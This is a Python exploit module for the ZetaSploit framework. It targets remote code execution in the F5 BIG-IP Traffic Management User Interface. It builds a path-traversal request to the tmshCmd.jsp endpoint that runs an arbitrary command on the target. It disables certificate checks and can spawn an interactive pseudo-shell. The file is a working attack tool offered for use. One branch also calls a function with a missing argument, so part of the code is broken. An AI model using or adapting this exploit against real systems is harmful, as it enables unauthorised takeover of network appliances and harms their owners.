#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import requests

from core.parser import parser
from core.badges import badges
from core.helper import helper

from utils.pseudo_shell import pseudo_shell

from requests.packages.urllib3.exceptions import InsecureRequestWarning

class ZetaSploitModule:
    def __init__(self):
        self.parser = parser()
        self.badges = badges()
        self.helper = helper()
        
        self.pseudo_shell = pseudo_shell()
        
        self.details = {
            'Name': "exploit/multi/f5_big_ip_tmui/remote_code_execution",
            'Authors': [
                'enty8080'
            ],
            'Description': "Remote Code Execution in F5 BIG-IP Traffic Management User Interface (TMUI).",
            'Dependencies': [
                'requests'
            ],
            'Comments': [
                ''
            ],
            'Risk': "high"
        }
        
        self.options = {
            'URL': {
                'Description': "Target URL address.",
                'Value': None,
                'Required': True
            },
            'COMMAND': {
                'Description': "Command to execute.",
                'Value': "whoami",
                'Required': True
            },
            'PSEUDO': {
                'Description': "Spawn Pseudo shell.",
                'Value': "no",
                'Required': False
            }
        }
        
    def generate_payload(self, target_url, command):
        self.badges.output_process("Generating payload...")
        
        payload = f"{target_url}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command={command}"
        return payload
    
    def send_payload(self, target_url, payload):
        self.badges.output_process("Sending payload...")
        request = requests.get(payload, verify=False)
        
        if request.status_code != 200:
            self.badges.output_error("Failed to send payload!")
            return None
        
        return request
        
    def execute_command(self, target_url, command):
        payload = self.generate_payload(target_url, command)
        request = self.send_payload(target_url, payload)
        
        if not request:
            return
        
        self.badges.output_process("Attempting to execute command...")
        
        command_output = request.json()["output"]
        if command_output.strip():
            self.badges.output_information("Command output:")
            self.badges.output_empty(command_output.strip())
        
    def run(self):
        target_url, command, pseudo = self.parser.parse_options(self.options)
        target_url = self.helper.normalize_url(target_url)
        
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        self.badges.output_process("Exploiting " + target_url + "...")
        
        payload = self.generate_payload(target_url, command)
        request = self.send_payload(target_url, payload)
        
        if not request:
            self.badges.output_error("Exploit failed!")
            return
        
        if pseudo in ['yes', 'y']:
            arguments = (target_url)
            self.pseudo_shell.spawn_pseudo_shell(self.details['Name'], self.execute_command, arguments)
        else:
            self.execute_command(command)
